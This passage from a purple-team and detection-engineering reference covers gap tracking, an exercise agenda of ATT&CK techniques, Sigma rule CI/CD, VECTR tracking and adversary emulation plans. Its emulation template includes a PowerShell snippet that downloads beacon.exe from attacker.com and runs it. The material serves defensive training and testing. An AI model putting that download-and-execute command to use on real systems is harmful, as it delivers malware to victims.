| 3 | T1070.001 | Event log cleared | Sysmon not deployed on server OU | SecOps | 2024-02-15 |

### Detection-Only Gaps (Need Alert Rules)

| # | Technique | Log Source Available | Proposed Rule | Owner |
|---|-----------|---------------------|---------------|-------|
| 1 | T1053.005 | Yes — EventID 4698 | Scheduled task with cmd/PS in content | ThreatDetect |
| 2 | T1547.001 | Yes — Sysmon EventID 13 | Reg write to HKCU\...\Run | ThreatDetect |
| 3 | T1021.006 | Yes — WinRM event log | WinRM lateral movement | ThreatDetect |

### Re-Test Schedule
All gaps to be remediated and re-tested by 2024-02-28.
```

### Sample One-Day Purple Team Agenda

```
09:00  Kickoff — rules of engagement, objectives, threat intel brief
09:30  Initial Access
         T1566.001  Spear-phishing attachment (macro)
         T1190      Exploit public-facing application (web shell)
10:30  Execution
         T1059.001  PowerShell (encoded, download cradle)
         T1059.003  cmd.exe (LOLBin abuse)
         T1059.007  JavaScript via wscript.exe
11:30  Persistence
         T1053.005  Scheduled task creation
         T1547.001  Run Key registry write
         T1543.003  Windows service creation
12:00  LUNCH — log review debrief, update gap tracker
13:00  Privilege Escalation
         T1548.002  UAC bypass (fodhelper)
         T1134.001  Token impersonation (CreateProcessWithToken)
14:00  Credential Access
         T1003.001  LSASS memory dump (mimikatz)
         T1558.003  Kerberoasting (Rubeus)
         T1552.001  Credentials in files
15:00  Lateral Movement
         T1021.002  SMB / PsExec lateral
         T1021.006  WinRM remote execution
         T1550.002  Pass-the-Hash
15:45  Exfiltration
         T1041      Exfil over C2 (HTTP/S)
         T1567.002  Upload to cloud service (OneDrive API)
         T1048.003  Exfil via DNS tunnel
16:30  Wrap-up
         Review gap tracker, assign owners, set remediation deadlines
         Next exercise date: 90 days
```

---

## 9. Detection Engineering Workflow

### Detection-as-Code Principles

- Version control all detection rules in Git (just like application code)
- Every rule requires: ATT&CK tag, author, false positive documentation, severity
- Rule changes require pull request review — peer review catches mistakes
- Automated testing: every rule must have a test that it fires on known-bad data
- CI/CD deploy: merged rules auto-deploy to SIEM

### Rule Lifecycle

```
Draft → Review → Test → Deploy → Monitor → Retire

Draft:
  - Atomic test identifies gap
  - Analyst writes Sigma rule targeting observed log fields
  - Tests rule against atomic test log data (TP confirmed)
  - Tests against known-good baseline (FP rate acceptable)

Review:
  - PR submitted to detection-rules repository
  - Peer review: accuracy, ATT&CK tag, severity level, FP documentation
  - Security architect review for high/critical rules

Test:
  - CI pipeline runs Sigma validator (schema check)
  - CI runs pySigma conversion to target SIEM
  - CI runs rule against labeled test data (TP and FP datasets)
  - All tests must pass before merge

Deploy:
  - Merge to main triggers CI/CD deploy to SIEM (staging first, then production)
  - Slack/Teams notification: "Rule T1053.005 deployed to Splunk"

Monitor:
  - False positive rate tracked per rule (alert/TP ratio)
  - If FP rate > 20%, auto-create tuning ticket
  - Monthly review of rule effectiveness

Retire:
  - Rule covers technique no longer in threat model → archive, not delete
  - Rule replaced by better version → old rule tagged as deprecated
```

### Sigma Rule CI/CD Pipeline

```yaml
# .github/workflows/detection-rules.yml
name: Detection Rule CI/CD

on:
  push:
    branches: [main]
    paths:
      - 'rules/**/*.yml'
  pull_request:
    paths:
      - 'rules/**/*.yml'

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install sigma-cli
        run: pip install sigma-cli pySigma-backend-splunk pySigma-backend-elastic

      - name: Validate Sigma rule syntax
        run: sigma check rules/**/*.yml

      - name: Convert to Splunk SPL
        run: sigma convert -t splunk -p splunk_windows rules/ -o /tmp/splunk_rules.conf

      - name: Convert to Elastic EQL
        run: sigma convert -t elasticsearch -p ecs_windows -f eql rules/

      - name: Run test suite
        run: python tests/run_detection_tests.py

  deploy-staging:
    needs: validate
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to Splunk Staging
        env:
          SPLUNK_URL: ${{ secrets.SPLUNK_STAGING_URL }}
          SPLUNK_TOKEN: ${{ secrets.SPLUNK_STAGING_TOKEN }}
        run: python scripts/deploy_to_splunk.py --env staging

  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Deploy to Splunk Production
        env:
          SPLUNK_URL: ${{ secrets.SPLUNK_PROD_URL }}
          SPLUNK_TOKEN: ${{ secrets.SPLUNK_PROD_TOKEN }}
        run: python scripts/deploy_to_splunk.py --env production
```

### Detection Coverage Metrics Tracking

```python
import json, datetime
from pathlib import Path

RULES_DIR = Path("rules/")
COVERAGE_FILE = Path("coverage/coverage_history.jsonl")

def count_coverage(rules_dir):
    # Count ATT&CK technique coverage from Sigma rules.
    techniques = set()
    for rule_file in rules_dir.rglob("*.yml"):
        import yaml
        with open(rule_file) as f:
            rule = yaml.safe_load(f)
        for tag in rule.get("tags", []):
            if tag.startswith("attack.t"):
                tid = tag.replace("attack.", "").upper()
                techniques.add(tid)
    return techniques

covered = count_coverage(RULES_DIR)
snapshot = {
    "date": datetime.date.today().isoformat(),
    "technique_count": len(covered),
    "techniques": sorted(covered)
}

with open(COVERAGE_FILE, "a") as f:
    f.write(json.dumps(snapshot) + "\n")

print(f"ATT&CK technique coverage: {len(covered)} techniques")
```

---

## 10. VECTR — Purple Team Tracking

### Overview

**VECTR** (Vulnerability and Exploitation Tracking and Reporting) is a free, open-source
platform for tracking purple team test campaigns.

- **Repository:** https://github.com/SecurityRiskAdvisors/VECTR
- **Hosted:** SRA VECTR Cloud (free tier available)

### Key Capabilities

- Track test campaigns by ATT&CK technique across exercises
- Record outcomes: Detected / Prevented / Missed / Partial
- Store evidence: log snippets, screenshots, detection rule links
- Generate ATT&CK Navigator layers from exercise results
- Track detection coverage improvement over time
- Export reports for executive briefings

### VECTR Campaign Structure

```
Campaign: Q1 2024 Purple Team — APT29 Emulation
  └─ Assessment: Initial Access Phase
       ├─ Test Case: T1566.001 — Spear-phishing attachment
       │    ├─ Outcome: Detected
       │    ├─ Detection: Email gateway blocked + SIEM alert fired
       │    └─ Evidence: [Screenshot of alert]
       │
       ├─ Test Case: T1190 — Exploit public-facing app
       │    ├─ Outcome: Missed
       │    ├─ Root cause: WAF bypassed via encoding; no SIEM rule for web shell
       │    └─ Remediation: [Ticket #1234]
       │
  └─ Assessment: Execution Phase
       ├─ Test Case: T1059.001 — PowerShell
       │    ├─ Outcome: Detected
       │    └─ Detection: PowerShell block logging + Splunk alert
       │
```

### VECTR REST API

```python
import requests

VECTR_URL = "https://vectr.corp.local"
API_KEY = "your-api-key"
HEADERS = {"Authorization": f"ApiKey {API_KEY}", "Content-Type": "application/json"}

# Create a new campaign
campaign = requests.post(f"{VECTR_URL}/sra-purpletools-rest/rest/v1/campaigns",
    headers=HEADERS,
    json={
        "name": "Q1 2024 APT29 Emulation",
        "description": "Purple team exercise emulating APT29 TTPs",
        "db": "default"
    }
).json()

# Add a test case
test_case = requests.post(f"{VECTR_URL}/sra-purpletools-rest/rest/v1/testcases",
    headers=HEADERS,
    json={
        "campaignId": campaign["id"],
        "name": "T1059.001 - PowerShell Encoded Command",
        "phase": "Execution",
        "attackTechniqueId": "T1059.001",
        "outcome": "DETECTED",
        "outcomeNotes": "PowerShell block logging + Splunk rule PS_EncodedCommand fired within 45 seconds",
        "detectionSteps": "Search index=windows EventCode=4104 ScriptBlockText=*encodedcommand*"
    }
).json()

print(f"Test case created: {test_case['id']}")
```

---

## 11. Adversary Emulation Plans

### MITRE CTID Adversary Emulation Library

The Center for Threat-Informed Defense (CTID) publishes detailed adversary emulation
plans that map real threat actor behaviors to step-by-step commands:

**Repository:** https://github.com/center-for-threat-informed-defense/adversary_emulation_library

### APT29 (Cozy Bear) Emulation Plan

**Threat actor:** SVR (Russian Foreign Intelligence Service)
**Known attacks:** SolarWinds/SUNBURST, Democratic National Committee breach

| Phase | Technique | Tool | Detection Opportunity |
|-------|-----------|------|----------------------|
| Initial Access | T1566.001 | Spear-phishing with malicious link | Email gateway URL detonation |
| Execution | T1059.001 | PowerShell download cradle | PS block logging, EventID 4104 |
| Persistence | T1053.005 | Scheduled task | EventID 4698 |
| Defense Evasion | T1562.001 | Disable Windows Defender | EventID 7036 (service stop) |
| Credential Access | T1003.001 | LSASS dump (comsvcs.dll) | Process access to lsass.exe |
| Lateral Movement | T1021.002 | SMB lateral via WMI | EventID 4624 type 3, WMI activity |
| Collection | T1074.001 | Local data staging | Mass file access in short window |
| Exfiltration | T1048.003 | DNS tunnel exfil | Unusual DNS query volume/entropy |

### FIN6 (Carbanak / FIN7) Emulation Plan

**Threat actor:** Financially motivated, targets POS systems and hospitality
**Known attacks:** Restaurant chain POS breaches, Delta Airlines, Saks Fifth Avenue

| Phase | Technique | Description |
|-------|-----------|-------------|
| Initial Access | T1566.001 | Spear-phishing with MORE_EGGS backdoor |
| Execution | T1059.001 | PowerShell payload delivery |
| Persistence | T1543.003 | Windows service creation |
| Lateral Movement | T1021.002 | PsExec lateral movement |
| Collection | T1005 | POS data harvesting |
| Exfiltration | T1041 | Exfil to attacker-controlled server |

### menuPass (APT10) Emulation Plan

**Threat actor:** Chinese APT targeting MSPs and defense contractors
**Known attacks:** Operation Cloud Hopper (MSP compromise chain)

| Phase | Technique | Tool |
|-------|-----------|------|
| Initial Access | T1566.001 | Spear-phishing, watering hole |
| Execution | T1059.001 | PowerShell, PlugX loader |
| Persistence | T1547.001 | Registry Run keys |
| C2 | T1071.001 | HTTP C2 via PlugX/QuasarRAT |
| Lateral Movement | T1021.006 | WinRM lateral |
| Exfiltration | T1048.002 | FTP exfiltration |

### Sandworm (GRU Unit 74455) Emulation Plan

**Threat actor:** Russian GRU, destructive attacks on critical infrastructure
**Known attacks:** NotPetya, Ukrainian power grid, Olympic Destroyer

| Phase | Technique | Description |
|-------|-----------|-------------|
| Initial Access | T1190 | Exploit public-facing applications |
| Execution | T1059.001 | PowerShell execution |
| Impact | T1485 | Data destruction |
| Impact | T1486 | Ransomware-style encryption |
| Impact | T1529 | System shutdown/reboot |
| ICS | T0831 | Manipulation of control systems |

### Custom Emulation Plan Template

```markdown
## Custom Emulation Plan: [Threat Actor Name]

### Threat Actor Profile
- **Name:** [Actor name]
- **Attribution:** [Country/Group]
- **Motivation:** [Financial / Espionage / Destructive]
- **Target sectors:** [Finance / Healthcare / Government / etc.]
- **Key TTPs:** [Top 5-10 ATT&CK techniques]

### Emulation Steps

#### Phase 1: Initial Access
**Technique:** T1566.001 — Spear-phishing Attachment
**Tool:** Custom macro document
**Command:**
```powershell
# Macro drops and executes payload
$url = "https://attacker.com/beacon.exe"
$out = "$env:TEMP\update.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out
```
**Detection opportunity:** Email gateway, PowerShell logging, process creation

#### Phase 2: Execution
...
```

---

## 12. Key Resources

### Purple Team Platforms and Frameworks

| Resource | URL | Purpose |
|----------|-----|---------|
| **ATT&CK Navigator** | https://mitre-attack.github.io/attack-navigator/ | Coverage visualization |
| **Atomic Red Team** | https://github.com/redcanaryco/atomic-red-team | Individual technique tests |
| **CALDERA** | https://github.com/mitre/caldera | Adversary emulation platform |
| **VECTR** | https://github.com/SecurityRiskAdvisors/VECTR | Purple team tracking |
| **Sigma** | https://github.com/SigmaHQ/sigma | Generic detection rules |
| **D3FEND** | https://d3fend.mitre.org | Defensive countermeasure mapping |
| **CTID Emulation Library** | https://github.com/center-for-threat-informed-defense/adversary_emulation_library | Adversary emulation plans |
| **ATT&CK for ICS** | https://attack.mitre.org/matrices/ics/ | ICS/OT ATT&CK matrix |
| **MITRE ATT&CK CTI** | https://github.com/mitre/cti | ATT&CK STIX data |

### Detection Engineering Resources

| Resource | URL | Purpose |
|----------|-----|---------|
| **pySigma** | https://github.com/SigmaHQ/pySigma | Sigma conversion library |
| **Sigma-cli** | https://github.com/SigmaHQ/sigma-cli | Command-line Sigma converter |
| **Florian Roth's Blog** | https://cyb3rops.medium.com | Detection engineering insights |
| **Red Canary Blog** | https://redcanary.com/blog/ | Annual ATT&CK-mapped threat report |
| **ATT&CK Evaluations** | https://attackevals.mitre-engenuity.org | EDR/SIEM detection benchmarks |
| **Detection Engineering Weekly** | https://detectionengineering.net | Newsletter on detection engineering |

### Purple Team Learning Resources

| Resource | Type | Focus |
|----------|------|-------|
| **Purple Team Exercise Framework (PTEF)** | Guide | Structured exercise methodology |
| **SCYTHE Community Threats** | GitHub | Threat emulation content |
| **ATT&CK Purple Teaming** | MITRE docs | Official ATT&CK purple team guidance |
| **Red Canary Threat Detection Report** | Annual report | Real-world ATT&CK-mapped detections |
| **Specter Ops Blog** | Blog | Adversary simulation tradecraft |
| **SANS Detection Engineering** | Course | FOR508, FOR572, FOR610 |

### Tooling Quick Reference

```bash
# Atomic Red Team — List and run tests
Install-Module invoke-atomicredteam -Scope CurrentUser -Force
Invoke-AtomicTest T1059.001 -ShowDetailsBrief
Invoke-AtomicTest T1059.001 -TestNumbers 1

# CALDERA — Start server
git clone https://github.com/mitre/caldera.git --recursive
cd caldera && python3 server.py --insecure
# Access: http://localhost:8888

# Sigma — Convert rules
pip install sigma-cli pySigma-backend-splunk
sigma convert -t splunk -p splunk_windows rules/windows/

# Stratus Red Team (Cloud)
brew install datadog/stratus-red-team/stratus-red-team
stratus list
stratus detonate aws.execution.ec2-user-data

# VECTR — Docker deployment
docker-compose up -d
# Access: https://localhost:8443
```

---

*Last updated: 2024 | Part of the [TeamStarWolf](https://github.com/TeamStarWolf/TeamStarWolf) cybersecurity reference library.*
